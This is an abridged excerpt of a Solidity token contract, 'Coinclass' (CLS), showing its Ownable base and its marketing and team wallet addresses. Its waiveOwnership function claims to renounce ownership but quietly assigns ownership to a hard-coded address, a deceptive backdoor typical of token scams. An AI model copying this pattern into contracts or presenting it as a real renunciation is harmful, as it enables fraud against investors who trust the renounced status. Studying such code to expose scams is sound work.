...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x49DAf18E0d935b8Dc88e3b23cED9591a45a89D5f);
    }
...
contract Coinclass is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Coinclass";
    string private _symbol = "CLS";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x28A70e2c715765471Aa5f1685889D583eF90310f);
    address payable public teamWalletAddress = payable(0x3179fEdfba716704bf6166578133c2bAB0914aec);
